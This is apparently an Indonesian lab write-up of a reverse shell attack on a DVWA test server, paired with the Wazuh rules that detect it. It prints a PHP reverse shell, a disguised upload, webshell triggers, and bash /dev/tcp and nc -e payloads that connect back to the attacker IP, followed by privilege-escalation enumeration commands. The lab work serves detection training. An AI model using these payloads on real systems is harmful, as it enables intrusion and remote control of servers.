# Reverse Shell Attack

## Deskripsi

Setelah webshell berhasil diupload (lihat `05-file-upload-webshell`),
attacker melakukan spawn reverse shell yang membuat koneksi balik
dari server korban ke mesin attacker. Ini memberikan akses
interactive shell penuh, berbeda dengan webshell yang hanya
one-command-at-a-time.

## MITRE ATT&CK

- **Tactic:** Execution
- **Technique:** T1059.004 — Unix Shell

## Target

- **URL Upload:** `http://192.168.217.130/DVWA/vulnerabilities/upload/`
- **Webshell Path:** `http://192.168.217.130/DVWA/hackable/uploads/shell.php`
- **Attacker IP:** `192.168.217.129`
- **Listener Port:** `4444`

## Prerequisites

- Webshell sudah terupload dari simulasi sebelumnya (`05-file-upload-webshell`)
- Netcat tersedia di Kali attacker

## Persiapan

```bash
# Ambil session cookie dari browser
# F12 → Console → ketik: document.cookie

SESS="security=low; PHPSESSID=ISI_SESSION_DISINI"
```

![Session Setup](screenshot/session-setup.png)

---

## Attack Commands

### 1. Setup Listener di Kali

Membuka listener netcat di mesin attacker untuk menerima koneksi balik dari server korban.

```bash
nc -lvnp 4444
```

![Setup Listener](screenshot/setup-listener.png)

---

### 2. Buat Reverse Shell PHP

Membuat file PHP yang akan membuka koneksi TCP balik ke attacker dan meneruskan shell interaktif.

```bash
cat > /tmp/rev.php << 'REVSHELL'
<?php
$sock=fsockopen("192.168.217.129",4444);
$proc=proc_open("/bin/sh -i",array(0=>$sock,1=>$sock,2=>$sock),$pipes);
?>
REVSHELL
```

![Create Reverse Shell](screenshot/create-revshell.png)

---

### 3. Upload Reverse Shell via DVWA

Mengupload file reverse shell PHP melalui fitur upload DVWA.

```bash
curl -s "http://192.168.217.130/DVWA/vulnerabilities/upload/" \
  -b "$SESS" \
  -F "uploaded=@/tmp/rev.php;type=image/jpeg" \
  -F "Upload=Upload"
```

![Upload Reverse Shell](screenshot/upload-revshell.png)

---

### 4. Trigger Reverse Shell

Mengakses file reverse shell yang sudah diupload untuk memicu koneksi balik ke attacker.

```bash
curl "http://192.168.217.130/DVWA/hackable/uploads/rev.php"
```

![Trigger Reverse Shell](screenshot/trigger-revshell.png)

---

### 5. Shell Diterima — Post-Exploitation

Setelah reverse shell terhubung, attacker mendapat interactive shell dan menjalankan command reconnaissance.

```bash
# Di terminal listener Kali, shell sudah terhubung:
# connect to [192.168.217.129] from (UNKNOWN) [192.168.217.130]

# Identifikasi user
id
whoami

# Informasi sistem
uname -a
hostname
```

![Shell Received](screenshot/shell-received.png)

---

### 6. Reverse Shell via Existing Webshell

Alternatif: menggunakan webshell yang sudah ada dari simulasi sebelumnya untuk spawn reverse shell tanpa perlu upload file baru.

```bash
# Buka listener baru di terminal lain
nc -lvnp 5555

# Trigger reverse shell melalui webshell cmd parameter
curl -s "http://192.168.217.130/DVWA/hackable/uploads/shell.php?cmd=php+-r+'\$s%3dfsockopen(\"192.168.217.129\",5555)%3b\$p%3dproc_open(\"/bin/sh+-i\",array(0%3d>\$s,1%3d>\$s,2%3d>\$s),\$x)%3b'"
```

![Reverse Shell via Webshell](screenshot/revshell-via-webshell.png)

---

### 7. Enumerasi dari Reverse Shell

Setelah mendapat shell, attacker melakukan enumerasi untuk eskalasi privilege dan lateral movement.

```bash
# Cek sudo privileges
sudo -l

# Cek file SUID
find / -perm -4000 -type f 2>/dev/null

# Cek koneksi jaringan
ss -tlnp

# Cek crontab
cat /etc/crontab
```

![Enumeration](screenshot/enumeration.png)

---

### 8. Multiple Payload — Trigger Wazuh Detection

Mengirim berbagai reverse shell payload melalui webshell untuk memicu deteksi Wazuh rule 100014.

```bash
PAYLOADS=(
  "php+-r+'\$s%3dfsockopen(\"192.168.217.129\",4444)%3bexec(\"/bin/sh+-i+<%263+>%263+2>%263\")%3b'"
  "bash+-c+'bash+-i+>%26+/dev/tcp/192.168.217.129/4444+0>%261'"
  "nc+-e+/bin/sh+192.168.217.129+4444"
)

for payload in "${PAYLOADS[@]}"; do
  echo "=== Payload: $payload ==="
  curl -s "http://192.168.217.130/DVWA/hackable/uploads/shell.php?cmd=${payload}" \
    -o /dev/null -w "Status: %{http_code}\n"
  sleep 2
done
```

![Multiple Payloads](screenshot/multiple-payloads.png)

---

## Hasil Serangan di Terminal

### Reverse Shell Berhasil Terhubung

![Reverse Shell Connected](screenshot/revshell-connected.png)

> Reverse shell berhasil terhubung dari server korban `192.168.217.130`
> ke attacker `192.168.217.129:4444`. Attacker mendapat interactive
> shell sebagai user `www-data`, membuktikan Remote Code Execution
> dengan persistent access berhasil.

---

## Detection di Wazuh

### Rule 100050 — Reverse Shell Execution (Auditd)

![Wazuh Reverse Shell Auditd](screenshot/wazuh-revshell-auditd.png)

> Rule **100050** mendeteksi eksekusi reverse shell melalui auditd
> dengan level **15 (Critical)**.
> Deskripsi: *KRITIS: Reverse Shell execution terdeteksi*

### Rule 100014 — Reverse Shell Pattern (Web Log)

![Wazuh Reverse Shell Web](screenshot/wazuh-revshell-web.png)

> Rule **100014** mendeteksi pattern reverse shell di web log
> dengan level **15 (Critical)**.
> Deskripsi: *DVWA: KRITIS - Reverse Shell terdeteksi*

---

## Detection Summary

- **Rule ID:** `100050` — **Level:** `15` (Critical)
- **Rule Chain:** `80700` → `100050`
- **Log Source:** Auditd (`audit.key: reverse_shell`)
- **Rule ID:** `100014` — **Level:** `15` (Critical)
- **Rule Chain:** `100009,100010` → `100014`
- **Log Source:** Nginx web log
- **MITRE ID:** T1059.004
- **Description:** KRITIS: Reverse Shell terdeteksi

## Referensi

- [OWASP Reverse Shell](https://owasp.org/www-community/attacks/Reverse_Shell)
- [MITRE T1059.004](https://attack.mitre.org/techniques/T1059/004/)
